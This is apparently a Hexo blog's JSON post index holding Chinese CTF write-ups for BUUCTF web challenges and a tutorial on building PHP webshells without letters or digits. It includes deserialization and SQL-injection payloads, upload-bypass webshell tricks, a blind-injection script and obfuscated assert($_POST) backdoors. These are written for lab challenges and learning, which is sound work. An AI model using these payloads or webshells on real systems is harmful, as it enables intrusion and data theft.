{"pages":[{"title":"categories","text":"","link":"/categories/index.html"},{"title":"about","text":"","link":"/about/index.html"},{"title":"friends","text":"","link":"/friends/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"BUUCTF[NPUCTF2020]web WP","text":"[TOC] BUUCTF[NPUCTF2020]上周做了做NPUCTF的题，今天在buuoj上面复现了一波，顺便写写write up ReadlezPHP这是一道简单的反序列化的题进入页面没什么发现，只有一个跳转到西工大官网的链接，然后查看源码，发现一个隐藏的a标签 然后进入页面，看到了源码 12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp{ public $a; public $b; public function __construct(){ $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; } public function __destruct(){ $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); }}$c = new HelloPhp;if(isset($_GET['source'])){ highlight_file(__FILE__); die(0);}@$ppp = unserialize($_GET[&quot;data&quot;]); 这段代码的关键在于当执行反序列化函数的时候，调用__destruct函数执行echo $b($a)，我们便可以利用这个函数执行任意我们想执行的函数，从而达到getshell的目的。接下来便是写php脚本构造序列化了，期间试了很多函数比如system等等都被禁用了，但是我们还可以用assert这个函数。首先我们来了解一下断言（assert）这个函数，参考大佬的文章PHP assert 和 eval assert 判断一个表达式是否成立。返回true or false； 我们来看一个例子： 1234&lt;?php$a = &quot;123&quot;;echo assert(is_numeric($a));?&gt; 这段代码输出的结果是： 简言之就是assert()可以将整个字符串参数当作php参数执行，而类似的eval()函数是执行合法的php代码。接下来放出序列化的脚本 12345678910111213&lt;?phpclass HelloPhp{ public $a; public $b; }$c = new HelloPhp;$c-&gt;b = 'assert';$c-&gt;a = 'eval($_POST[a]);';echo urlencode(serialize($c)).&quot;&lt;br/&gt;&quot;;?&gt; 这里除了用assert()之外，还可以用call_user_func()函数 call_user_func — 把第一个参数作为回调函数调用 12345678&lt;?php function barber($type){ echo &quot;you wanted a $type haircut, no problem\\n&quot;;}call_user_func('barber','mushroom');?&gt;//返回内容如下：//you wanted a mushroom haircut, no problem 只要构造出call_user_func(phpinfo)就好了 payload: 1?data=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A16%3A%22eval%28%24_POST%5Ba%5D%29%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D 成功得出结果： flag就在phpinfo中 得到flag！ 未完待续···","link":"/2020/05/28/Kath4rs1s/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2020/05/28/hello-world/"},{"title":"test","text":"","link":"/2020/05/28/test/"},{"title":"buuoj 刷题记录（一）","text":"[TOC] [网鼎杯 2020 朱雀组]phpweb 抓包 date是一个函数，后面的p应该是它的参数，猜测使用了call_user_func(函数名，参数)函数使用 func=readfile&amp;p=index.php 读取源码 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;, &quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;, &quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;, &quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;, &quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;, &quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;, &quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;, &quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;, &quot;file_put_contents&quot;);function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else { return &quot;&quot;; }}class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }}/*$func = $_REQUEST[&quot;func&quot;];$p = $_REQUEST[&quot;p&quot;];if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(&quot;Hacker...&quot;); }} 禁用了很多函数，看到有 __destruct() 函数，尝试构造反序列化 12345678910111213141516&lt;?phpclass Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }}$a = new Test();//$a-&gt;p = 'find / -name flag*';$a-&gt;p = 'cat /tmp/flagoefiu4r93';$a-&gt;func = 'system';print_r(urlencode(serialize($a))); 寻找flag文件 读取flag [MRCTF2020]你传你ma呢利用BurpSuite修改MIME欺骗后端文件类型 修改 Content-Type: image/png 然后就可以传任意文件后缀 利用.htaccess来制作图片马 增加使用php解析的文件后缀(.jpg) 1AddType application/x-httpd-php .jpg 然后再写个一句话，连上蚁剑即可 [极客大挑战 2019]Upload绕过后缀名检验：php、php3、php5、php7、pht、phtml文件头加入 GIF89a修改 Content-Type: image/jpeg可解析为php的标签 12345&lt;?php phpinfo(); ?&gt;&lt;?= phpinfo(); ?&gt;&lt;script language=php&gt;phpinfo();&lt;/script&gt; //php7移除&lt;? phpinfo(); ?&gt; //需要php.ini中short_open_tag=On&lt;% phpinfo(); %&gt; //需要php.ini中asp_tags = On php7移除 php版本是5.5.9，用第三个上传之后连接蚁剑即可 [FBCTF2019]RCEService1234567891011121314151617181920212223&lt;?phpputenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) { $json = $_REQUEST['cmd']; if (!is_string($json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } else { echo 'Attempting to run command:&lt;br/&gt;'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) { system($cmd); } else { echo 'Invalid input'; } echo '&lt;br/&gt;&lt;br/&gt;'; }}?&gt; 正则表达式修饰符s匹配多行，这里直接用%0A换行符绕过正则payload： 1{%0A&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0A} Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用 [SUCTF 2019]CheckIn 考点：文件上传 利用.user.ini构造php后门，.user.ini的使用前提是目录中必须有至少一个php文件，.user.ini有两个配置参数：auto_prepend_file和auto_append_file。auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中： 1auto_prepend_file=01.gif 01.gif是要包含的文件。所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。 参考链接https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html [GXYCTF2019]BabyUpload没什么好说的，apache服务器上传.htaccess文件 [BJDCTF 2nd]Schrödinger毫无意义的一道题，浪费了十几分钟的时间。 [MRCTF2020]PYWebsite查看源码有flag.php，访问然后修改X-Forwarded-For: 127.0.0.1可得flag [网鼎杯 2018]Comment 二次注入，git泄露 爆破得到账号密码，登陆然后是git泄露，先下载源码然后修复，得到如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION['login'] != 'yes'){ header(&quot;Location: ./login.php&quot;); die();}if(isset($_GET['do'])){switch ($_GET['do']){case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = &quot;insert into board set category = '$category', title = '$title', content = '$content'&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break;case 'comment': $bo_id = addslashes($_POST['bo_id']); $sql = &quot;select category from board where id='$bo_id'&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0){ $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = &quot;insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'&quot;; $result = mysql_query($sql); } header(&quot;Location: ./comment.php?id=$bo_id&quot;); break;default: header(&quot;Location: ./index.php&quot;);}}else{ header(&quot;Location: ./index.php&quot;);}?&gt; do=write的时候对传入的数据进行转移，但是之后数据库会自动清除反斜杠，然后do=commit的时候对取出的category没有进行处理就插入，导致了二次注入，所以前面那个addslashes根本起不到防护的作用第一次输入category和第二次输入content可以拼接，如下 1234insert into commentset category = '',content=user(),/*', content = '*/#', bo_id = '$bo_id'&quot;; 然后再放两个payload，读取flag: 12',content=(select load_file('/etc/passwd')),/*',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/* elementmaster这个没什么好说的，直接上脚本 12345678910111213141516import osimport requests as reqelements = ('H', 'He', 'Li', 'Be', 'B', 'C', 'N', 'O', 'F', 'Ne', 'Na', 'Mg', 'Al', 'Si', 'P', 'S', 'Cl', 'Ar', 'K', 'Ca', 'Sc', 'Ti', 'V', 'Cr', 'Mn', 'Fe', 'Co', 'Ni', 'Cu', 'Zn', 'Ga', 'Ge', 'As', 'Se', 'Br', 'Kr', 'Rb', 'Sr', 'Y', 'Zr', 'Nb', 'Mo', 'Te', 'Ru', 'Rh', 'Pd', 'Ag', 'Cd', 'In', 'Sn', 'Sb', 'Te', 'I', 'Xe', 'Cs', 'Ba', 'La', 'Ce', 'Pr', 'Nd', 'Pm', 'Sm', 'Eu', 'Gd', 'Tb', 'Dy', 'Ho', 'Er', 'Tm', 'Yb', 'Lu', 'Hf', 'Ta', 'W', 'Re', 'Os', 'Ir', 'Pt', 'Au', 'Hg', 'Tl', 'Pb', 'Bi', 'Po', 'At', 'Rn', 'Fr', 'Ra', 'Ac', 'Th', 'Pa', 'U', 'Np', 'Pu', 'Am', 'Cm', 'Bk', 'Cf', 'Es', 'Fm','Md', 'No', 'Lr', 'Rf', 'Db', 'Sg', 'Bh', 'Hs', 'Mt', 'Ds', 'Rg', 'Cn', 'Nh', 'Fl', 'Mc', 'Lv', 'Ts', 'Og', 'Uue')for symbol in elements: link = &quot;http://bb55496d-1807-46ab-96ae-138ad4583386.node3.buuoj.cn/&quot; + symbol + &quot;.php&quot; response = req.get(link) if response.status_code == 200: print(response.text, end='') else: continue","link":"/2020/07/13/buuoj_01/"},{"title":"buuoj 刷题记录（二）","text":"[TOC] [CISCN2019 总决赛 Day2 Web1]Easyweb 考点：盲注，文件上传查看robots.txt： 12User-agent: *Disallow: *.php.bak 抓包过程发现user.php和image.php，于是下载源码，查看image.php 123456789101112131415161718&lt; ?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id='{$id}' or path='{$path}'&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); GET请求id和path参数时首先经过addslashes()函数转义，在单引号，双引号，反斜杠和NULL前面加上反斜杠“\\”,然后再经过str_replace()函数把&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;中的任意一个替换为空，下面的select语句构造sql注入，传入的值为 1id=\\0&amp;path= or 1=1%23 经过addslashes()处理之后select语句就变成了 * from images where id12再经过str_replace()函数处理之后变成了```select * from images where id='\\' or path=' or 1=1%23'&quot;); 构造成功，盲注python脚本： 123456789101112131415161718192021222324import requestsurl = 'http://a9d9fc32-9b43-4a17-8c8b-d137102a6211.node3.buuoj.cn/image.php'flag = ''for i in range(1,100): for j in range(32,128): # payload = '?id=%5C0%27&amp;path=%20or%20if(ascii(mid(database(),{},1))={},1,0)%23'.format(i,j) # 数据库： ciscnfinal # payload = &quot;?id=%5C0%27&amp;path=%20or%20if(ascii(mid((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x636973636e66696e616c),{},1))={},1,0)%23&quot;.format(i,j) # 表名： images,users #payload = &quot;?id=%5C0%27&amp;path=%20or%20if(ascii(mid((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273),{},1))={},1,0)%23&quot;.format(i,j) # users列名： username,password payload = &quot;?id=%5C0&amp;path=%20or%20if(ascii(mid((select%20group_concat(password)%20from%20users),{},1))={},1,0)%23&quot;.format(i,j) # passwor: b5fef2a49e1cee3ee711 r = requests.get(url+payload) #print(url + path) if len(r.text)&gt;10000: flag += chr(j) print(flag) break if(j==127): breakprint(flag) 得到账号和密码登陆，是一个上传界面上传文件之后把上传日志记录到一个php文件，而没有给出文件路径，考虑文件名注入一句话，php被过滤，选择&lt;?= ?&gt;标签，即可，flag在根目录。 [BSidesCF 2019]Futurellaf12一键获取flag。 [WUSTCTF2020]朴实无华 考点：php弱类型，命令注入查看源码 12345678910111213141516171819202122232425262728293031323334353637&lt;?php//level 1if (isset($_GET['num'])){ $num = $_GET['num']; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){ echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;; }else{ die(&quot;金钱解决不了穷人的本质问题&quot;); }}else{ die(&quot;去非洲吧&quot;);}//level 2if (isset($_GET['md5'])){ $md5=$_GET['md5']; if ($md5==md5($md5)) echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;; else die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);}else{ die(&quot;去非洲吧&quot;);}//get flagif (isset($_GET['get_flag'])){ $get_flag = $_GET['get_flag']; if(!strstr($get_flag,&quot; &quot;)){ $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag); echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;; system($get_flag); }else{ die(&quot;快到非洲了&quot;); }}else{ die(&quot;去非洲吧&quot;);}?&gt; 一共有三层，第一层利用php弱类型，即可绕过 12intval('2e4')=2intval('2e4'+1)=20001 第二层也是弱类型，找到一个0e开头的字符串，其md5值也是0e开头的字符串即可绕过，写个脚本跑一下就出来了。第三层是执行命令，不能有空格和cat，空格用$IFS$9替换，cat用tac替换，然后读取flag。 [CISCN2019 华东南赛区]Web11 考点：ssti模板注入 打开页面发现页面会记录IP地址，第一时间想到存在XFF头注入，又看到提示Smarty,是模板注入了，抓包然后测试：当输入{1+1}的时候，显示2。看了看别人的writeup，smarty中的{if}标签中可以执行php语句，得flag： 1{if readfile('/flag')}{/if} [BSidesCF 2020]Had a bad day 考点：文件包含 进入页面两个按钮，随便点一个，出来一张图片，发现url变成了这样： 1http://e7a037d7-b95d-419a-ae85-6f3acf5e0ea5.node3.buuoj.cn/index.php?category=woofers 把woofers改为index发现不行，然后改为index woofer出现报错信息：可以发现include语句是这样的，获取url中的category参数然后拼接.php，然后包含这个php文件，尝试用伪协议读取文件： 1?category=php://filter/convert.base64-encode/resource=index base64解码得到index.php源码： 123456789101112&lt;?php$file = $_GET['category'];if(isset($file)){ if( strpos( $file, &quot;woofers&quot; ) !== false || strpos( $file, &quot;meowers&quot; ) !== false || strpos( $file, &quot;index&quot;)){ include ($file . '.php'); } else{ echo &quot;Sorry, we currently only support woofers and meowers.&quot;; }}?&gt; 参数中必须包含index,woofers,meowers中的一个，然后这样刚好读到flag。 1?category=php://filter/convert.base64-encode/resource=index/../flag","link":"/2020/07/20/buuoj-02/"},{"title":"无字母数字构造webshell的学习","text":"[toc] 前言最近碰到一道题，便学习了一下相关无字母数字构造webshell的知识。题目如下： 12345678910111213141516&lt;?phpinclude 'flag.php';if(isset($_GET['code'])){ $code = $_GET['code']; if(strlen($code)&gt;40){ die(&quot;Long.&quot;); } if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){ die(&quot;NO.&quot;); } @eval($code);}else{ highlight_file(__FILE__);}//$hint = &quot;php function getFlag() to get flag&quot;;?&gt; 题目中可以看到字母和数字是没法使用的，而且payload长度必须在40以内。我们需要绕过正则过滤，利用不可见字符或者正则表达式遗漏的字符通过各种变换来构造出a-z中的任意一个字符，并且长度小于40，然后再利用php允许动态函数执行的特点，拼接出一个函数名，然后动态执行之即可。那么，我们现在的问题就是如何通过各种变换，是的我们能够成功构造出所需的函数，然后拿到webshell。 前置知识php5和7的差异：php5中assert是一个函数，我们可以通过$f=’assert’;$f(…);这样的方法来动态执行任意代码。 但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。 PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个括号中可以是任意PHP表达式。 php特性(1)代码中没有引号的字符都自动作为字符串 我猜这也是为什么传马的时候$_GET['cmd']和$_GET[cmd]都可以 (2)Ascii码大于 0x7F 的字符都会被当作字符串 (3)php 在获取 HTTP GET 参数的时候默认是获得到了字符串类型 (4)在字符串的变量的后面跟上{}大括号或者中括号[]，里面填写了数字，这里是把字符串变量当成数组处理所以有${_GET}{cmd} 不使用数字字母构造数字利用了php弱类型的特性，true的值为1，所以true+true==2。 12$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;'); //$__=2$_=$__/$__; //$_=1 在php中未定义的变量默认值为null，null==false==0，所以我们能够在不使用任何数字的情况下通过对未定义变量的自增操作来得到一个数字。 123&lt;?php$_++; //$_=1 也可以用!操作符来进行布尔类型的转换。 1234&lt;?phpecho !$_;//这个代码将输出1?&gt; 构造webshell构造无字母数字webshell一般用到下面这几种方法： 异或在php中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，想得到a-z中的某个字母，就找到某两个非字母、数字的字符，他们异或的结果是这个字母即可。 12345&lt;?php echo &quot;A&quot;^&quot;?&quot;;?&gt;运行结果：~ 输出的结果是字符”~”，这是因为代码对字符”A”和字符”?”进行了异或操作。在PHP中两个变量进行异或时，会先将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCII值，再转换成字符串。例如下面这个php后门： 123456&lt;?php$_=(':'^'[').('('^'[').('('^'[').('&gt;'^'[').(')'^'[').('/'^'['); // $_='assert';$__='_'.('+'^'{').('/'^'`').('('^'{').('/'^'{'); // $__='_POST';$___=$$__;$_($___[_]); // assert($_POST[_]);?&gt; 执行结果如下： 取反来看一个汉字”和” 123456&gt;&gt;&gt; print(&quot;和&quot;.encode('utf8'))b'\\xe5\\x92\\x8c'&gt;&gt;&gt; print(&quot;和&quot;.encode('utf8')[2])140&gt;&gt;&gt; print(~&quot;和&quot;.encode('utf8')[2])-141 “和”的第三个字节的值为140[0x8c]，取反的值为-141。负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。因此 1234567&lt;?php$_=&quot;和&quot;;print(~($_{2}));print(~&quot;\\x8c&quot;);?&gt;两个写法性质一样结果会输出： ss py脚本： 123456def get(shell): hexbit=''.join(map(lambda x: hex(~(-(256-ord(x)))),shell)) print(hexbit)get('phpinfo')#0x8f0x970x8f0x960x910x990x90 直接贴出p神的webshell吧 1234567891011&lt;?php$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;'); //$__=2$_=$__/$__; //$_=1$____='';$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__}); //assert$_____='_';$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_}); //_POST$_=$$_____; //$_POST$____($_[$__]); //assert($_POST[2]) 这里也有一种简短的写法${~”\\xa0\\xb8\\xba\\xab”}它等于$_GET。这里相当于直接把utf8编码的某个字节提取出来统一进行取反。 利用字符串自增/自减php的小技巧，先看文档：https://www.php.net/manual/zh/language.operators.increment.php也就是说，’a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array： 12345&lt;?php$_=[];$_=@&quot;$_&quot;; // $_='Array';echo $_[0].$_[3];// 输出Aa 再加上我们不适用数字构造出的数字，写出下面这个webshell： 12345678910111213141516171819202122232425262728293031323334&lt;?$_=[];$_=@&quot;$_&quot;; // $_='Array';$_=$_[('('=='=')]; // $_=$_[0];$_=A;$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++;$___.=$__; // E$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // R$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // T$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;@$___($_[_]); 执行成功： payload在上面那道题中有一个payload是这样的： 1?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo 这里利用了php7中执行动态函数的方法，在php5中是执行不成功的，我们来拆解分析一下payload： 12345678%ff ^ %160 = _%ff ^ %184 = G%ff ^ %186 = E%ff ^ %171 = T%ff%ff%ff%ff^%a0%b8%ba%ab = _GET${%ff%ff%ff%ff^%a0%b8%ba%ab} = $_GET${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff} = $_GET{%ff}phpinfo() 这里放出一个fuzz脚本，帮助快速找到异或的字符： 12345678910111213$payload = '';$argv = str_split('_GET');for ($i=0; $i &lt; count($argv); $i++) { for ($j=0; $j &lt; 255; $j++) { $k = chr($j)^chr(255); //dechex(255)=0xff if($k == $argv[$i]){ echo &quot;%ff ^ %&quot;.$j.&quot; = &quot;.$k.&quot;&lt;br&gt;&quot;; $payload .= '%'.dechex($j); } }}echo $payload; 还有一个payload是这样的，这个是取反： 1(~%8F%97%8F%96%91%99%90)(); 还有这个payload，也是取反: 1?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=phpinfo 这个是~在{}中执行了取反操作，所以${~”\\xa0\\xb8\\xba\\xab”}取反相当于$_GET。","link":"/2020/07/23/webshell/"}],"tags":[],"categories":[{"name":"ctf","slug":"ctf","link":"/categories/ctf/"}]}